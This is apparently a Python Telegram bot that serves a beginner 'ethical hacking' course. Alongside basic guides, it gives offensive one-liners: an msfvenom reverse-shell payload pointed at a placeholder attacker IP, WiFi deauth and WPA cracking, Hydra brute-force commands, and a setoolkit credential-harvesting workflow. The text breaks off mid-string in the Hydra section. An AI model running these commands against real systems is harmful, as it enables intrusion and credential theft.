from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler,MessageHandler, filters
import difflib
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
# Topics configuration
topics = {
    "main": [
        ("🛡️ Basic Hacking", "basic"),
        ("⚙️ Advanced Hacking", "advanced"),
        ("🛠️ Tools & Installation", "tools"),
        ("📈 Career & Certifications", "career"),
        ("🚀 Start Hacking", "start_hacking"),
        ("📜 Ethical Hacking Roadmap", "30_day_roadmap")
    ],


    "basic": [
        ("What is Ethical Hacking?", "WIH"),
        ("Types of Hackers", "TOH"),
        ("Steps for hacking", "SFH"),
        ("Reconnaissance", "REC"),
        ("Networking", "networking"),
        ("Linux Commands", "LC"),
        ("Installing Kali Linux", "IKL"),
        ("Interesting Linux Commands", "ILC")
    ],

    "start_hacking": [
        ("📅 30-Day Ethical Hacking Bootcamp", "30_day_hacking"),
        ("🎮 Game Hacking Week-5", "game_hacking_week"),
        ("📱 Mobile Hacking Week-6", "mobile_hacking_week"),
        ("🌐 Website Hacking Week-7", "website_hacking_week"),
        ("📶 WiFi Hacking Module Week-8", "wifi_hacking_module"),
        ("📲 Bluetooth Hacking Module Week-9", "bluetooth_hacking_module"),
        ("🧠 Red Teaming Week-10", "red_team_week"),
        ("🧠 Advanced Web Hacking Week-11", "advanced_web_hacking_week"),
        ("📲 Mobile Reverse Engineering Week-12", "mobile_reverse_engineering_week"),
        ("🦠 Malware Development Week-13", "malware_development_week")
    ],

    "30_day_hacking": [
        (f"📅 Day {i}", f"day{i}") for i in range(1, 31)
    ],

    "game_hacking_week": [
        ("🎮 Day 33: Cheat Engine Basics", "day33"),
        ("📱 Day 34: Game Guardian Android", "day34"),
        ("🧩 Day 35: Unity Game Modding", "day35"),
        ("🔍 Day 36: IDA / Ghidra Reverse", "day36"),
        ("🧬 Day 37: Frida Patching", "day37"),
        ("🧠 Day 38: Trainer Creation", "day38"),
        ("🛡️ Day 39: Ethics & Anti-Cheat", "day39")
    ],

    "mobile_hacking_week": [
        ("📱 Day 40: Android Internals & Lab Setup", "day40"),
        ("🗂️ Day 41: Static Analysis of APKs", "day41"),
        ("🧪 Day 42: Dynamic Analysis & Frida Hooking", "day42"),
        ("🛠️ Day 43: APK Reversing & Modding", "day43"),
        ("🔐 Day 44: Bypassing Root & SSL Pinning", "day44"),
        ("📊 Day 45: MobSF + Burp Interception", "day45"),
        ("🧠 Day 46: Advanced Attacks & Disclosure", "day46")
    ],

    "website_hacking_week": [
        ("🌐 Day 47: Intro to Website Hacking", "day47"),
        ("🛠️ Day 48: HTML & JS Recon", "day48"),
        ("🔓 Day 49: Authentication Bypass", "day49"),
        ("🧼 Day 50: SQL Injection Deep Dive", "day50"),
        ("💉 Day 51: XSS & DOM Injection", "day51"),
        ("🎭 Day 52: CSRF & Clickjacking", "day52"),
        ("🧩 Day 53: IDOR & Web Logic Flaws", "day53"),
        ("🧪 Day 54: Web CTF Labs", "day54")
    ],

    "wifi_hacking_module": [
        ("📶 Day 55: WiFi Basics & Monitor Mode", "day55"),
        ("🔓 Day 56: WPA Handshake Capture & Cracking", "day56"),
        ("🧨 Day 57: Evil Twin Attack & WiFi MITM", "day57")
    ],

    "bluetooth_hacking_module": [
        ("📲 Day 58: Bluetooth Protocols & Tools", "day58"),
        ("🔍 Day 59: Bluetooth Device Scanning & Sniffing", "day59"),
        ("🛠️ Day 60: Bluetooth Exploitation & Payloads", "day60")
    ],

    "red_team_week": [
        ("🧠 Day 61: CrackMapExec & AD Enumeration", "day61"),
        ("📡 Day 62: Lateral Movement Techniques", "day62"),
        ("🎯 Day 63: Custom Payload Development", "day63"),
        ("🧪 Day 64: Antivirus & EDR Evasion", "day64"),
        ("📥 Day 65: Initial Access Techniques", "day65"),
        ("🖥️ Day 66: C2 Channels & Persistence", "day66"),
        ("🚨 Day 67: Red Team Ops + Blue Team Detection", "day67")
    ],

    "advanced_web_hacking_week": [
        ("🧠 Day 68: Advanced SQL Injection & WAF Bypass", "day68"),
        ("🌐 Day 69: SSRF & Internal Services Exploitation", "day69"),
        ("📄 Day 70: XXE (XML External Entities)", "day70"),
        ("🧪 Day 71: Command Injection & RCE Deep Dive", "day71"),
        ("💥 Day 72: Template Injection & SSTI", "day72"),
        ("🏗️ Day 73: Subdomain Takeover & DNS Tricks", "day73"),
        ("📦 Day 74: Advanced Burp Suite & Automation", "day74")
    ],

    "mobile_reverse_engineering_week": [
        ("📲 Day 75: APK Structure & Tools Setup", "day75"),
        ("🔍 Day 76: Static Analysis with JADX & apktool", "day76"),
        ("🔓 Day 77: Smali Code & Method Tracing", "day77"),
        ("🧬 Day 78: Frida + Objection for Runtime Hacking", "day78"),
        ("🛡️ Day 79: SSL Pinning & Root Detection Bypass", "day79"),
        ("🧠 Day 80: Hooking Android Functions with Frida", "day80"),
        ("🎯 Day 81: Full App Exploit & Report Creation", "day81")
    ],

    "malware_development_week": [
        ("🧬 Day 82: Malware Types & Lab Setup", "day82"),
        ("💥 Day 83: Payload Development with msfvenom", "day83"),
        ("🧪 Day 84: Writing Custom Trojans in Python", "day84"),
        ("🔐 Day 85: Encrypting Payloads & Basic Crypters", "day85"),
        ("🚫 Day 86: Antivirus & EDR Evasion Techniques", "day86"),
        ("📡 Day 87: Building a C2 with Flask + WebSockets", "day87"),
        ("🧾 Day 88: Malware Analysis & IOC Extraction", "day88")
    ],

    "advanced": [
        ("🖥️ System Hacking", "system"),
        ("🧠 Social Engineering", "social"),
        ("📡 Recon & Info Gathering", "recon"),
        ("🧪 Penetration Testing", "pentesting"),
        ("📶 Wi-Fi & Network Hacking", "wifi"),
        ("📱 Mobile Hacking", "mobile"),
        ("💻 Linux & Terminal Setup", "linux"),
        ("🔐 Cryptography", "crypto"),
        ("🕵️ Vulnerability Assessment", "vuln"),
        ("🧰 Payloads & Exploits", "payloads"),
        ("🌐 Website Testing", "web"),
        ("☁️ Cloud Hacking", "cloud"),
        ("📱 Mobile App Hacking", "apk_hacking"),
        ("🦠 Malware Analysis", "malware")
    ],

    "tools": [
        ("🔍 Nmap", "nmap"),
        ("🌐 Wireshark", "wireshark"),
        ("🔑 Hydra", "hydra"),
        ("🧪 Burp Suite", "burpsuite"),
        ("📦 Metasploit", "metasploit"),
        ("🛡️ Nikto", "nikto"),
        ("🕷️ SQLMap", "sqlmap"),
        ("🔧 John the Ripper", "john"),
        ("📱 MobSF", "mobsf"),
        ("📡 Aircrack‑ng", "aircrackng"),
        ("🧰 Ghidra", "ghidra")
    ],

    "career": [
        ("Why Choose Ethical Hacking?", "why_career"),
        ("Top Ethical Hacking Certifications", "certs"),
        ("Roadmap to Become an Ethical Hacker", "roadmap"),
        ("Job Roles & Salaries", "jobs"),
        ("Career Tips & Resources", "career_tips")
    ],

}

content = {
    "basic": "*🛡️ Basic Hacking Topics:*\n\nBegin your journey into the world of ethical hacking. Choose a foundational topic to build your skills and unlock the path to becoming a cybersecurity expert.",

    "WIH": "*🛡️ What is Ethical Hacking?*\n\n"
           "Ethical hacking is the authorized practice of bypassing system security to identify potential threats and vulnerabilities in a network or system. "
           "Organizations hire ethical hackers to simulate cyberattacks and discover weak points that could be exploited by malicious actors.\n\n"
           "*Goals:*\n"
           "- Strengthen system defenses\n"
           "- Prevent unauthorized access\n"
           "- Ensure compliance with security standards\n"
           "- Minimize risks before real attackers exploit them\n\n"
           "✅ Ethical hacking is legal, authorized, and follows a code of conduct unlike malicious hacking.",

    "TOH": "*🎭 Types of Hackers:*\n\n"
           "1. *White Hat Hackers*: Cybersecurity professionals who legally hack systems to strengthen security.\n"
           "2. *Black Hat Hackers*: Criminal hackers who exploit systems for financial gain, disruption, or theft.\n"
           "3. *Gray Hat Hackers*: Operate in the gray area — they may hack without permission but don’t have malicious intent.\n"
           "4. *Script Kiddies*: Inexperienced individuals who use pre-built tools or scripts without understanding how they work.\n"
           "5. *Hacktivists*: Hackers motivated by political or social causes, aiming to promote agendas or protest.\n"
           "6. *State-Sponsored Hackers*: Work for governments to attack or defend against foreign threats.\n"
           "7. *Red Team vs. Blue Team Hackers*: Red teams simulate attacks; blue teams defend against them.",

    "SFH": "*🧱 Steps for Hacking (Cyber Kill Chain):*\n\n"
           "1. *Reconnaissance*: Gathering information about the target (passive and active scanning).\n"
           "2. *Scanning*: Identifying live systems, ports, and services using tools like Nmap or Nessus.\n"
           "3. *Gaining Access*: Exploiting known vulnerabilities (e.g., using Metasploit).\n"
           "4. *Maintaining Access*: Installing malware or creating backdoors for persistent access.\n"
           "5. *Clearing Tracks*: Deleting logs and hiding malicious files to avoid detection.\n"
           "6. *Post-Exploitation*: Data exfiltration, lateral movement, or privilege escalation.\n"
           "7. *Reporting*: (In ethical hacking) Documenting findings and suggesting fixes.",

    "REC": "*🔍 Reconnaissance (Footprinting):*\n\n"
           "The first phase of ethical hacking where the goal is to gather as much data as possible about the target without alerting them.\n\n"
           "*Types:*\n"
           "- Passive: Public sources like WHOIS, search engines, social media.\n"
           "- Active: Direct interaction like port scanning, DNS queries.\n\n"
           "*Common Tools:*\n"
           "- `whois`, `nslookup`: DNS and domain details\n"
           "- `theHarvester`: Email & subdomain harvesting\n"
           "- `Maltego`: Visual data mining\n"
           "- `Recon-ng`, `Shodan`, `Google Dorking`\n\n"
           "🎯 Goal: Map the target’s attack surface.",

    "networking": "*🌐 Networking Essentials for Hackers:*\n\n"
                  "A strong understanding of networking is crucial in ethical hacking. It helps you understand how systems communicate and where vulnerabilities may exist.\n\n"
                  "*Topics to Master:*\n"
                  "- OSI & TCP/IP Models\n"
                  "- IP Addressing & Subnetting\n"
                  "- TCP vs UDP Protocols\n"
                  "- ARP, ICMP, DNS, DHCP\n"
                  "- Common Ports: 21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), etc.\n\n"
                  "*Useful Networking Commands:*\n"
                  "`ping`, `traceroute`, `ipconfig/ifconfig`, `netstat`, `nslookup`, `nmap`\n\n"
                  "*Packet Analysis Tool:* `Wireshark`\n"
                  "*Port Scanner:* `Nmap`",

    "LC": "*🐧 Essential Linux Commands for Hackers:*\n\n"
          "Linux is the preferred OS for hackers due to its flexibility, scripting power, and open-source nature.\n\n"

          "*🔹 File & Directory Commands:*\n"
          "`ls` – List directory contents  →  `ls -la`\n"
          "`cd` – Change directory  →  `cd /etc`\n"
          "`dir` – List contents of directory  →  `dir /home`\n"
          "`pwd` – Print current working directory  →  `pwd`\n"
          "`mkdir` – Make new directory  →  `mkdir new_folder`\n"
          "`rmdir` – Remove empty directory  →  `rmdir old_folder`\n"
          "`rm` – Remove file/directory  →  `rm -rf file.txt`\n"
          "`mv` – Move or rename files  →  `mv old.txt new.txt`\n"
          "`cp` – Copy files/directories  →  `cp file.txt /tmp/`\n\n"

          "*🔐 Permissions & Ownership:*\n"
          "`chmod` – Change file permissions  →  `chmod 755 script.sh`\n"
          "`chown` – Change file owner/group  →  `chown ankit:admin file.txt`\n"
          "`chgrp` – Change group ownership  →  `chgrp devs file.txt`\n"
          "`umask` – Set default permission mask  →  `umask 0022`\n"
          "`chmod +x script.sh` – Make script executable\n\n"

          "*🌐 Networking Tools:*\n"
          "`ifconfig` – View/modify network interfaces  →  `ifconfig eth0 down`\n"
          "`ip` – Manage IP, routes, interfaces  →  `ip addr show`\n"
          "`netstat` – Show active connections and ports  →  `netstat -tuln`\n"
          "`ping` – Check connectivity  →  `ping -c 4 google.com`\n"
          "`curl` – Transfer data from or to a server  →  `curl -I https://example.com`\n"
          "`wget` – Download files from the internet  →  `wget -c https://site.com/file.iso`\n"
          "`dig` – DNS lookup and domain info  →  `dig +short openai.com`\n\n"

          "*⚙️ System & Process Management:*\n"
          "`ps` – Show running processes  →  `ps aux`\n"
          "`top` – Real-time system monitor  →  `top`\n"
          "`kill` – Terminate a process  →  `kill 1234`\n"
          "`htop` – Enhanced process viewer (needs install)  →  `htop`\n"
          "`df` – Show disk usage  →  `df -h`\n"
          "`du` – Show directory size  →  `du -sh /home/user`\n"
          "`uptime` – Show system uptime and load  →  `uptime`\n\n"

          "*📝 Viewing & Editing Files:*\n"
          "`cat` – Display file content  →  `cat file.txt`\n"
          "`less` – Scroll through file content  →  `less bigfile.log`\n"
          "`nano` – Simple terminal editor  →  `nano notes.txt`\n"
          "`vi` – Powerful text editor  →  `vi config.sh`\n"
          "`grep` – Search for patterns in files  →  `grep 'error' log.txt`\n"
          "`find` – Locate files by name or type  →  `find / -name \"*.conf\"`\n\n"

          "*💡 Scripting & Automation:*\n"
          "`bash` – Shell scripting language  →  Automate tasks using `.sh` scripts\n"
          "`cron` – Schedule repetitive tasks  →  `crontab -e`\n"
          "`expect` – Automate interactive shell sessions  →  Automate SSH, FTP, etc.\n\n",

    "ILC": "*🐧 Interesting Linux Commands for Hackers:*\n\n"
           "*😎 Fun & Hacker-Style Terminal Commands:*\n"
           "`cowsay 'Hack the planet!'` – Talking ASCII cow 🐄\n"
           "`sl` – Steam locomotive when you mistype `ls`\n"
           "`cmatrix` – Matrix rain effect 💻\n"
           "`lolcat` – Rainbow-colored output 🌈\n"
           "`figlet HACKER` – Big ASCII banners\n"
           "`toilet H4cker` – Styled ASCII text art\n"
           "`oneko` – Cat chases your cursor 🐱\n"
           "`aafire` – Burning fire in terminal 🔥\n"
           "`asciiquarium` – ASCII aquarium 🐠\n"
           "`fortune | cowsay | lolcat` – Fortune cow combo 🐄🌈\n"
           "`telnet towel.blinkenlights.nl` – Watch Star Wars in ASCII ⭐\n"
           "`rev`, `yes`, `cal`, `uptime`, `date`, `watch` – Quirky tools\n"
           "`hollywood` – Simulated hacker terminal effect 🎬\n"
           "`hacker` – Show off with animated hacking look\n\n"
           "you can install this all command by \n\n"
           "`sudo apt install cowsay lolcat sl cmatrix figlet toilet fortune aafire oneko asciiquarium hollywood` \n\n"
           "*🔥 Tip:* You can combine fun tools with `lolcat` for extra flair. Try `figlet Hello | lolcat`!",

    "IKL": "*💻 Installing Kali Linux (Step-by-Step):*\n\n"
           "Kali Linux is a Debian-based distribution packed with pre-installed security tools.\n\n"
           "*1. Download ISO:*\n"
           "- Official site: [https://www.kali.org](https://www.kali.org)\n\n"
           "*2. Create Bootable USB:*\n"
           "- Use `Rufus` (Windows) or `Balena Etcher` (Linux/macOS)\n\n"
           "*3. Install Kali:*\n"
           "- Boot your system from the USB\n"
           "- Follow on-screen installation steps (language, time, disk partitioning, etc.)\n\n"
           "*4. Post-Installation:*\n"
           "- Update system:\n"
           "  `sudo apt update && sudo apt upgrade`\n"
           "- Install guest additions (if using VirtualBox):\n"
           "  `sudo apt install virtualbox-guest-utils`\n\n"
           "*5. Run in Virtual Machine (Optional):*\n"
           "- Use VirtualBox or VMware for dual-boot-free experience.\n\n"
           "🎯 *Recommended*: Use a VM if you're a beginner to avoid damaging your primary system.",

    "advanced": "*🔍 Advanced Hacking Topics:*\n\nDive deep into real-world offensive techniques. Select a topic:",

    "system": "*🔐 System Hacking:* (Windows/Linux)\n\n📌 Key Phases:\n"
              "- *Gaining Access*: Weak creds, unpatched services, malware\n"
              "- *Privilege Escalation*: Sudo misconfigurations, kernel exploits, token impersonation\n"
              "- *Maintaining Access*: Backdoors, scheduled tasks, services\n"
              "- *Clearing Tracks*: Modify event logs, timestamps (e.g., Timestomp)\n\n"
              "🛠 Tools: `mimikatz`, `winPEAS`, `linPEAS`, `chntpw`, `meterpreter`\n"
              "💡 *Example*: `net user administrator /active:yes` enables built-in admin on Windows.",

    "social": "*🎭 Social Engineering:*\n\nTarget human trust and behavior.\n📌 Techniques:\n"
              "- *Phishing*: Fake emails/websites to steal credentials\n"
              "- *Baiting*: Malware-infected USB drops\n"
              "- *Impersonation*: Posing as trusted person\n\n"
              "🛠 Tool: `setoolkit`\n"
              "💡 *Workflow*: `sudo setoolkit` → Social‑Engineering Attacks → Credential Harvester → Mock site → Collect creds.",

    "recon": "*🔎 Recon & Info Gathering:*\n\nPhase aims to build a complete map of the target environment.\n📌 Use Cases:\n"
             "- Domain registration: `whois example.com`\n"
             "- DNS entry collection: `nslookup`, `dig`, `dnsenum`\n"
             "- IoT & device fingerprinting: `shodan host 1.2.3.4`\n"
             "- Directory enumeration: `dirb http://target.com`\n\n"
             "Outcome: A complete blueprint for attack planning.",

    "pentesting": "*🧪 Penetration Testing Structure:*\n\nA methodical approach to simulate cyber-attacks.\n📌 Types:\n"
                  "- *Blackbox*: No prior intel\n"
                  "- *Graybox*: Partial access/info\n"
                  "- *Whitebox*: Full system data\n\n"
                  "📘 Phases:\n"
                  "1. Planning & Scoping\n2. Recon & Scanning\n3. Exploitation\n4. Post‑Exploitation\n5. Reporting & Remediation\n\n"
                  "⚙️ Tools: Metasploit, Burp Suite, Nmap, SQLmap, Nikto",

    "wifi": "*📶 Wi‑Fi & Wireless Attacks:*\n\nHack local wireless networks.\n📌 Steps:\n"
            "1. Enable monitor mode: `airmon-ng start wlan0`\n"
            "2. Capture handshakes: `airodump-ng wlan0mon`\n"
            "3. Deauth to force clients to reconnect: `aireplay-ng -0 5 -a <BSSID> wlan0mon`\n"
            "4. Crack WPA/WPA2: `aircrack-ng -w wordlist.txt capture.cap`\n\n"
            "⚙️ Tools: aircrack-ng suite, hashcat, reaver, wash",

    "mobile": "*📱 Mobile Hacking:*\n\nExplore app exploitation & analysis.\n📌 Topics:\n"
              "- *Static Analysis*: Reverse-engineer APK using `APKTool`\n"
              "- *Dynamic*: Use `Frida`, `Xposed`\n"
              "- *RATs & Spyware*: `AndroRAT`, custom payloads\n\n"
              "⚙️ Framework: `MobSF` – upload APK, receive vulnerability report.\n"
              "`./setup.sh` → open http://localhost:8000 → scan APK/IPA",

    "linux": "*🐧 Linux & Terminal Foundations:*\n\nLearn advanced shell usage and scripting.\n📌 Essentials:\n"
             "- Terminal commands and directory structure\n"
             "- Permissions & SUID bits\n"
             "- Automating tasks via bash scripts and cron jobs\n\n"
             "💡 Example script:\n```bash\n#!/bin/bash\n# scan host\nnmap -sS $1\n```",

    "crypto": "*🔐 Cryptography Practical Guide:*\n\nSafeguard communication/data.\n📌 Topics:\n"
              "- *Hashing* (MD5/SHA256) for integrity checks\n"
              "- *Symmetric Encryption* (AES)\n"
              "- *Asymmetric Encryption* (RSA, ECC)\n\n"
              "🛠 Tools: `openssl`, `gpg`, `hashcat`\n"
              "`echo -n password | sha256sum`\n"
              "`openssl enc -aes-256-cbc -salt -in file.txt -out file.enc`",

    "vuln": "*🛡️ Vulnerability Assessment:*\n\nScan and identify possible weak points.\n📌 Techniques:\n"
            "- *Automated scans*: Nmap scripts, Nessus, OpenVAS\n"
            "- *Manual reviews*: Code, logic, auth flows\n\n"
            "🛠 Commands:\n"
            "`nmap --script vuln -p80,443 target.com`\n"
            "`nikto -h http://target.com`",

    "payloads": "*💥 Payloads & Exploits:*\n\nGenerate attack vectors using msfvenom.\n📌 Workflow:\n"
                "1. Select payload type (reverse shell)\n"
                "2. Generate binary/script\n"
                "3. Serve it and catch a session via Metasploit\n\n"
                "Example:\n"
                "`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe`",

    "web": "*🌐 Website Security Testing:*\n\nIdentify and test web vulnerabilities.\n📌 Focus Areas:\n"
           "- SQL Injection (SQLi)\n"
           "- Cross‑Site Scripting (XSS)\n"
           "- Cross‑Site Request Forgery (CSRF)\n"
           "- Insecure file uploads, LFI/RFI\n\n"
           "🛠 Tools:\n"
           "`sqlmap -u \"http://target.com/?id=1\" --dbs`\n"
           "Burp Suite with Scanner/Repeater modules\n"
           "`nikto` for server misconfigurations",

    "cloud": "*☁️ Cloud Hacking:*\n\nCloud environments (like AWS, Azure, GCP) can be misconfigured, making them vulnerable.\n\n🔐 *Key Techniques:*\n- Misconfiguration Exploits (e.g., public S3 buckets)\n- IAM Abuse (privilege escalation)\n- Metadata API Exploitation\n\n🛠 *Tools:*\n- `ScoutSuite`: Multi-cloud security auditing tool.\n- `Pacu`: AWS exploitation framework.\n\n💡 *Example Attack:*\n- Enumerating IAM roles:\n`aws iam list-roles`\n- Exploiting metadata service:\n`curl http://169.254.169.254/latest/meta-data/`",

    "malware": "*🦠 Malware Analysis:*\n\nMalware analysis helps understand how malicious software works and how to detect/remove it.\n\n🧪 *Techniques:*\n- Static Analysis (without execution)\n- Dynamic Analysis (during execution)\n- Reverse Engineering\n\n🛠 *Tools:*\n- `Ghidra`, `IDA Pro`, `PEStudio`, `VirusTotal`\n\n💡 *Tips:*\n- Use virtual machines (VMs) for safety.\n- Monitor file/registry/network behavior during execution.\n\n🔍 *Example Static Check:*\n`strings malware.exe | less`",

    "tools": "*🧰 Tools & Software Submenu:*\n\nSelect a tool to explore installation, real-world usage, examples, and pro tips.",

    "nmap": "*🔍 Nmap* – Network Scanner & Port Mapper\n\n"
            "🧠 *What is Nmap?*\n"
            "Nmap (Network Mapper) is a powerful open-source tool for network discovery, security auditing, and enumeration.\n"
            "It scans systems to identify open ports, running services, OS versions, and possible vulnerabilities.\n\n"

            "🛠 *Installation:*\n"
            "*Linux (Debian/Ubuntu):*\n"
            "`sudo apt update && sudo apt install nmap`\n"
            "*Kali Linux:* Pre-installed\n"
            "*Windows/macOS:* [https://nmap.org/download.html](https://nmap.org/download.html)\n\n"

            "📦 *Basic Syntax:*\n"
            "`nmap [options] <target>`\n"
            "Examples:\n"
            "`nmap 192.168.1.1`\n"
            "`nmap scanme.nmap.org`\n\n"

            "📡 *Basic Scanning Commands:*\n"
            "- Ping Scan (Check if host is up):\n"
            "`nmap -sn 192.168.1.0/24`\n"
            "- Quick Port Scan:\n"
            "`nmap -F 192.168.1.1`\n"
            "- Service Version Detection:\n"
            "`nmap -sV 192.168.1.1`\n"
            "- Operating System Detection:\n"
            "`nmap -O 192.168.1.1`\n"
            "- Full Scan:\n"
            "`nmap -sS -sV -O -Pn 192.168.1.1`\n\n"

            "🎯 *Useful Scan Types:*\n"
            "- SYN Scan (Stealth): `-sS`\n"
            "- UDP Scan: `-sU`\n"
            "- TCP Connect Scan: `-sT`\n"
            "- Aggressive Scan: `-A`\n"
            "- No DNS resolution: `-n`\n"
            "- Skip ping check: `-Pn`\n\n"

            "🧠 *Targeting Options:*\n"
            "- Single IP: `192.168.1.10`\n"
            "- Range: `192.168.1.1-50`\n"
            "- CIDR: `192.168.1.0/24`\n"
            "- Hostname: `scanme.nmap.org`\n"
            "- Input from file: `-iL targets.txt`\n\n"

            "🔍 *Detecting Vulnerabilities:*\n"
            "Use with NSE scripts:\n"
            "`nmap --script vuln 192.168.1.1`\n"
            "Some useful scripts:\n"
            "- `http-vuln-*`\n"
            "- `smb-vuln-*`\n"
            "- `ftp-anon`, `ssh2-enum-algos`\n\n"

            "📁 *Output Formats:*\n"
            "- Normal: `-oN scan.txt`\n"
            "- XML: `-oX scan.xml`\n"
            "- Grepable: `-oG scan.grep`\n"
            "- All at once: `-oA fullscan`\n\n"

            "🧪 *Real-World Practice Tasks:*\n"
            "✅ Scan your local network for live hosts\n"
            "✅ Identify open ports and running services on your own system\n"
            "✅ Use `-A` on a known host to analyze services\n"
            "✅ Try `--script vuln` against a vulnerable VM like Metasploitable\n\n"

            "🛡️ *Ethical Usage Reminder:*\n"
            "⚠️ Only scan systems you own or have explicit permission to test.\n"
            "Unauthorized scanning is illegal and may trigger firewalls or alerts.\n\n"

            "💡 *Pro Tips:*\n"
            "- Combine `-T4` for faster scanning\n"
            "- Use `--top-ports 100` for common ports\n"
            "- Chain scans with tools like `Nikto`, `Hydra`, or `Metasploit`\n"
            "- Use `Zenmap` GUI for visual analysis (if preferred)\n\n"

            "🏁 *Conclusion:*\n"
            "Nmap is a must-have tool for any ethical hacker, penetration tester, or sysadmin. It uncovers vital details about network infrastructure.\n"
            "_Explore the invisible. Map the network. Master Nmap._ 🌐🧠",

    "wireshark": "*🌐 Wireshark* – Network Packet Sniffing Tool\n\n"
            "🧠 *What is Wireshark?*\n"
            "Wireshark is a powerful open-source packet analyzer used for:\n"
            "- Network troubleshooting\n"
            "- Protocol development\n"
            "- Ethical hacking & traffic inspection\n\n"

            "📦 *Features:*\n"
            "- Captures real-time network packets\n"
            "- Decodes protocols (TCP, UDP, HTTP, DNS, ARP, etc.)\n"
            "- Deep packet inspection with GUI & filters\n\n"

            "🛠 *Installation:*\n"
            "*Windows/macOS:* [Download](https://www.wireshark.org/download.html)\n"
            "*Linux (Debian/Ubuntu):*\n"
            "`sudo apt update && sudo apt install wireshark`\n"
            "`sudo usermod -aG wireshark $USER && newgrp wireshark`\n\n"

            "📚 *Basic Concepts:*\n"
            "- *Packet*: Small unit of transmitted data\n"
            "- *Capture Filter*: Filters packets during capture\n"
            "- *Display Filter*: Filters after capture\n"
            "- *Interface*: Network device to monitor (e.g., eth0, wlan0)\n\n"

            "🧪 *How to Start Capturing:*\n"
            "1. Open Wireshark\n"
            "2. Choose interface (e.g., wlan0)\n"
            "3. Click the shark icon to begin\n"
            "4. Stop with the red square icon\n\n"

            "🎯 *Basic Display Filters:*\n"
            "`http` – Only HTTP\n"
            "`tcp` – TCP traffic\n"
            "`ip.src == 192.168.1.1` – Packets *from* IP\n"
            "`ip.dst == 192.168.1.100` – Packets *to* IP\n"
            "`dns` – DNS traffic\n"
            "`tcp.port == 80` – HTTP port\n\n"

            "🚀 *Capture Filters (before sniffing):*\n"
            "`tcp port 80` – Only HTTP\n"
            "`host 192.168.1.1` – Specific IP\n"
            "`src host 10.0.0.5` – Source IP only\n"
            "`net 192.168.0.0/24` – IP range\n\n"

            "🔍 *Deep Packet Inspection:*\n"
            "Click any packet → Expand headers:\n"
            "- Ethernet II\n"
            "- Internet Protocol (IP)\n"
            "- TCP/UDP headers\n"
            "- HTTP requests/responses\n\n"

            "🧠 *Hacking Use Cases:*\n"
            "- *Credential Sniffing:* Capture HTTP POST data\n"
            "- *Session Hijacking:* Look for cookies & tokens\n"
            "- *DNS Spoof Detection:* Multiple DNS replies\n"
            "- *MITM Analysis:* Inspect ARP poisoned traffic\n"
            "- *Backdoor Tracing:* Unknown C2 traffic/ports\n\n"

            "🛡️ *Ethical Guidelines:*\n"
            "⚠️ Only capture on networks you own or have permission to access.\n"
            "👨‍⚖️ Unauthorized sniffing is illegal and unethical.\n\n"

            "💻 *Practice Tasks:*\n"
            "• Capture login to testphp.vulnweb.com using POST filter:\n"
            "`http.request.method == \"POST\"`\n"
            "• Detect DNS to 8.8.8.8:\n"
            "`dns && ip.dst == 8.8.8.8`\n"
            "• View TCP 3-way handshake:\n"
            "`tcp.port == 80`\n\n"

            "🛠 *Expert Tips:*\n"
            "- Save captures as `.pcap`\n"
            "- Use coloring rules for traffic types\n"
            "- Combine filters:\n"
            "`tcp.port == 80 && ip.src == 192.168.1.5`\n"
            "- Export filtered packets: *File → Export Specified Packets*\n\n"

            "🎓 *Challenges:*\n"
            "1. Capture and extract queried domain from DNS\n"
            "2. Identify file download over HTTP\n"
            "3. Analyze TCP 3-way handshake\n"
            "4. Save packets to/from specific IP during download\n"
            "5. Detect SYN scan:\n"
            "`tcp.flags.syn == 1 && tcp.flags.ack == 0`\n\n"

            "🧩 *Bonus Tool: Tshark (CLI):*\n"
            "`tshark -i wlan0 -Y \"http\" -T fields -e ip.src -e http.request.uri`\n"
            "*Analyze .pcap files offline with GUI or CLI*\n\n"

            "🏁 *Conclusion:*\n"
            "Wireshark gives visibility into raw network traffic, helping ethical hackers spot vulnerabilities, monitor traffic, and reverse engineer attacks.\n"
            "_Master Wireshark, master the network!_ 🌐🛡️",

    "hydra": "*🔑 Hydra* – Brute Force Login Cracker\n\n"
            "🧠 *What is Hydra?*\n"
            "Hydra is a powerful password-cracking tool that supports rapid dictionary attacks against over 50 protocols and services such as FTP, SSH, Telnet, HTTP, SMB, and more.\n\n"

            "🛠 *Installation:*\n"
            "*Kali Linux:* Pre-installed\n"
            "*Debian/Ubuntu:*\n"
            "`sudo apt update && sudo apt install hydra`\n"
            "*Windows:* Use WSL or install via Cygwin\n\n"

            "📦 *Supported Protocols:*\n"
            "- FTP, SSH, Telnet\n"
            "- HTTP/HTTPS, SMB\n"
            "- RDP, VNC, POP3, IMAP\n"
            "- MySQL, MSSQL, PostgreSQL, and more\n\n"

            "📚 *Basic Syntax:*\n"
            "`hydra -L users.txt -P passwords.txt <protocol>://<target>`\n"
            "Example:\n"
            "`hydra -L userlist.txt -P passlist.txt ssh://192.168.1.10`\n\n"

            "🔐 *Example Attacks:*\n"
            "- *FTP Brute Force:*\n"
            "`hydra -l admin -P rockyou.txt ftp://192.168.1.100`\n\n"
            "- *SSH Dictionary Attack:*\n"
            "`hydra -L users.txt -P passwords.txt ssh://192.168.1.105`\n\n"
            "- *HTTP Form Brute Force:*\n"
            "`hydra -l admin -P pass.txt 192.168.1.200 http-post-form \"/login.php:user=^USER^&pass=^PASS^:F=incorrect\"`\n\n"
            "- *RDP Attack (slow):*\n"
            "`hydra -t 1 -V -f -L users.txt -P pass.txt rdp://192.168.1.50`\n\n"

            "⚙️ *Important Flags:*\n"
            "- `-l` → single username\n"
            "- `-L` → username list\n"
            "- `-p` → single password\n"
            "- `-P` → password list\n"
            "- `-s` → port number\n"
            "- `-f` → stop after first valid login\n"
            "- `-V` → verbose output\n"
            "- `-t` → tasks (parallel threads)\n\n"

            "📁 *Useful Wordlists:*\n"
            "- `/usr/share/wordlists/rockyou.txt`\n"
            "- Custom lists with `cewl`, `crunch`, or `cupp`\n\n"

            "🎯 *Real-World Use Cases:*\n"
            "✅ Penetration testing SSH login strength\n"
            "✅ Testing weak FTP credentials on embedded devices\n"
            "✅ Brute-forcing insecure web logins\n"
            "✅ Finding default creds in IoT/routers\n\n"

            "🧠 *Tips & Tricks:*\n"
